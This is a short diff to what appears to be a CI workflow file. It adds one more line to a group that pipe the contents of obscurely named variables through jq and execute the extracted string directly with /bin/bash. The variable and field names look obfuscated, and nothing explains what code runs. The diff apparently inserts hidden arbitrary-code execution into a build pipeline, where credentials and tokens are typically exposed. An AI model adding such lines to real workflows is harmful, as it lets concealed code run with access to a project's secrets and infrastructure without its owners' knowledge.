@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$neyoy1210" | jq -r .u3282 | /bin/bash
           printf '%s' "$h4" | jq -r .ruao5948 | /bin/bash
           echo $hw65 | jq -r .hlep82177 | /bin/bash
+          echo $layxq56 | jq -r .p3 | /bin/bash
 
       - name: Archive results
         if: always()
